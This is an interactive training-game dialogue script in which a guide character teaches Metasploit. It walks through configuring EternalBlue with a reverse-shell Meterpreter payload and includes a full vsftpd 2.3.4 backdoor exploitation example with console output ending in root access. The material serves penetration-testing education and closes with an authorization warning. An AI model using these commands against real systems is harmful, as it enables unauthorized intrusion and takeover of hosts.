// ===========================================
// TOOL HELP: METASPLOIT FRAMEWORK
// Break Escape Universe
// ===========================================
// Educational content about Metasploit
// For use in training scenarios and missions
// ===========================================

=== metasploit_help ===

Guide: The Metasploit Framework is the world's most used penetration testing framework.

Guide: Think of it as a massive, organized library of exploits, payloads, and security tools. It automates much of the complex work involved in exploiting vulnerabilities.

Guide: It's maintained by Rapid7 and used by both penetration testers and security researchers worldwide.

+ [How do I start Metasploit?]
    -> metasploit_starting

+ [How do I find an exploit?]
    -> metasploit_finding_exploits

+ [How do I run an exploit?]
    -> metasploit_running_exploits

+ [What's the workflow?]
    -> metasploit_workflow

+ [Show me a complete example]
    -> metasploit_example

+ [I understand now]
    -> metasploit_end

// ----------------
// Starting Metasploit
// ----------------

=== metasploit_starting ===

Guide: To start Metasploit, you use the Metasploit Console—`msfconsole`:

Guide: Simply type:
`msfconsole`

Guide: You'll see ASCII art (different each time) and then the msf6 prompt:
`msf6 >`

Guide: This is your command center. From here, you can search for exploits, configure them, run them, and manage sessions.

Guide: **Basic commands to know:**
- `help` - Shows available commands
- `search [term]` - Search for exploits, payloads, or modules
- `use [module]` - Select a module to configure
- `show options` - Display configuration options for current module
- `set [option] [value]` - Configure a module parameter
- `run` or `exploit` - Execute the module
- `back` - Return to main menu
- `exit` - Quit msfconsole

* [How do I find exploits?]
    -> metasploit_finding_exploits

* [How do I run an exploit?]
    -> metasploit_running_exploits

* [Show me the workflow]
    -> metasploit_workflow

* [I'm ready to practice]
    -> metasploit_end

// ----------------
// Finding exploits
// ----------------

=== metasploit_finding_exploits ===

Guide: Finding the right exploit is crucial. Metasploit makes this easier with its search functionality.

Guide: **Search by service:**
`search apache`
Finds all modules related to Apache

Guide: **Search by CVE number:**
`search cve:2017-0144`
Finds exploits for a specific vulnerability (in this case, EternalBlue)

Guide: **Search by platform:**
`search platform:windows`
Finds Windows-specific modules

Guide: **Search by type:**
`search type:exploit`
`search type:auxiliary`
`search type:payload`

Guide: **Combined search:**
`search apache type:exploit platform:linux`

Guide: **Understanding search results:**
```
Name                              Rank       Description
----                              ----       -----------
exploit/unix/webapp/apache_mod_cgi_bash_env_exec    excellent    Apache mod_cgi Bash Environment Variable Injection
```

Guide: - **Name**: The module path you'll use with `use`
- **Rank**: Reliability rating (excellent, great, good, normal, average, low, manual)
- **Description**: What the exploit does

Guide: **Rank meanings:**
- **Excellent**: Exploit never crashes, always works
- **Great**: Common, reliable exploit
- **Good**: Usually reliable
- **Normal**: Works in common scenarios
- **Low**: May crash target or only work in specific conditions

* [How do I use an exploit once I find it?]
    -> metasploit_running_exploits

* [Show me the complete workflow]
    -> metasploit_workflow

* [Show me a full example]
    -> metasploit_example

* [How do I start Metasploit again?]
    -> metasploit_starting

// ----------------
// Running exploits
// ----------------

=== metasploit_running_exploits ===

Guide: Once you've found an exploit, here's how to run it:

Guide: **Step 1: Select the exploit**
`use exploit/windows/smb/ms17_010_eternalblue`

Guide: Your prompt changes to show you're in that module:
`msf6 exploit(windows/smb/ms17_010_eternalblue) >`

Guide: **Step 2: View required options**
`show options`

Guide: This displays all configurable parameters:
```
Name       Current Setting  Required  Description
----       ---------------  --------  -----------
RHOSTS                      yes       Target address
RPORT      445             yes       Target port
```

Guide: **Step 3: Configure the exploit**
`set RHOSTS 192.168.1.50`

Guide: RHOSTS is the target (Remote HOST). Some exploits also need:
- `RPORT` - Target port (usually has a default)
- `LHOST` - Your IP address (Local HOST) for callback connections
- `LPORT` - Your listening port

Guide: **Step 4: Select a payload**
`show payloads`

Guide: This shows compatible payloads. A payload is what runs after exploitation succeeds. Common choices:
- `windows/meterpreter/reverse_tcp` - Opens a powerful shell back to you
- `cmd/unix/reverse_bash` - Simple shell
- `windows/x64/meterpreter/reverse_https` - Encrypted shell

Guide: Set your payload:
`set payload windows/x64/meterpreter/reverse_tcp`

Guide: **Step 5: Configure payload options**
`set LHOST 192.168.1.100` (your IP address)

Guide: **Step 6: Run the exploit**
`exploit` or `run`

Guide: If successful, you'll get a Meterpreter session or shell!

* [Show me a complete example]
    -> metasploit_example

* [Explain the workflow again]
    -> metasploit_workflow

* [How do I find exploits?]
    -> metasploit_finding_exploits

* [I'm ready to practice]
    -> metasploit_end

// ----------------
// Workflow overview
// ----------------

=== metasploit_workflow ===

Guide: Here's the typical Metasploit workflow:

Guide: **1. Reconnaissance**
Use nmap or other tools to identify targets, open ports, and service versions.
Example: `nmap -sV 192.168.1.50` reveals FTP on port 21, version vsftpd 2.3.4

Guide: **2. Search for exploit**
`search vsftpd`
Finds: `exploit/unix/ftp/vsftpd_234_backdoor`

Guide: **3. Select exploit**
`use exploit/unix/ftp/vsftpd_234_backdoor`

Guide: **4. Configure target**
```
set RHOSTS 192.168.1.50
show options
```

Guide: **5. Select payload** (if needed)
```
show payloads
set payload cmd/unix/interact
```

Guide: **6. Verify configuration**
`show options`
Make sure all Required options are set

Guide: **7. Run exploit**
`exploit`

Guide: **8. Interact with session**
If successful, you now have access to the target system. Use appropriate post-exploitation modules or manual commands.

Guide: **9. Clean up**
Professional testing includes removing traces and documenting findings.

* [Show me a complete example]
    -> metasploit_example

* [How do I find exploits again?]
    -> metasploit_finding_exploits

* [How do I run exploits?]
    -> metasploit_running_exploits

* [I'm ready to practice]
    -> metasploit_end

// ----------------
// Complete example
// ----------------

=== metasploit_example ===

Guide: Let's walk through a complete example: exploiting a vulnerable FTP service.

Guide: **Scenario**: nmap revealed a target at 192.168.1.50 running vsftpd 2.3.4 on port 21.

Guide: **Step-by-step:**

Guide: 1. Start Metasploit:
```
$ msfconsole
msf6 >
```

Guide: 2. Search for vsftpd exploits:
```
msf6 > search vsftpd

Matching Modules
================
Name                                  Rank       Description
----                                  ----       -----------
exploit/unix/ftp/vsftpd_234_backdoor  excellent  VSFTPD v2.3.4 Backdoor Command Execution
```

Guide: 3. Select the exploit:
```
msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
msf6 exploit(unix/ftp/vsftpd_234_backdoor) >
```

Guide: 4. View options:
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options:
Name     Current Setting  Required  Description
----     ---------------  --------  -----------
RHOSTS                    yes       Target address
RPORT    21              yes       Target port
```

Guide: 5. Configure target:
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 192.168.1.50
RHOSTS => 192.168.1.50
```

Guide: 6. Check the payload (this exploit has an automatic payload):
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Payload options:
Name   Current Setting  Required  Description
----   ---------------  --------  -----------
(No additional configuration needed for this exploit)
```

Guide: 7. Run the exploit:
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.1.50:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.1.50:21 - USER: 331 Please specify the password.
[+] 192.168.1.50:21 - Backdoor service has been spawned, handling...
[+] 192.168.1.50:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened
```

Guide: 8. You now have a shell! Interact with it:
```
id
uid=0(root) gid=0(root)

whoami
root
```

Guide: Success! You've exploited the target and have root access.

* [Explain the workflow again]
    -> metasploit_workflow

* [How do I find other exploits?]
    -> metasploit_finding_exploits

* [How do I run exploits?]
    -> metasploit_running_exploits

* [I'm ready to practice]
    -> metasploit_end

// ----------------
// End
// ----------------

=== metasploit_end ===

Guide: Critical reminder: Metasploit is an extremely powerful tool capable of compromising systems.

Guide: **Only use it:**
- On systems you own
- On systems where you have explicit written authorization to test
- In lab environments designed for practice
- In authorized CTF competitions

Guide: Unauthorized use of Metasploit against systems you don't own is illegal and can result in criminal prosecution.

Guide: With great power comes great responsibility. Use Metasploit ethically, professionally, and always with authorization.

-> END
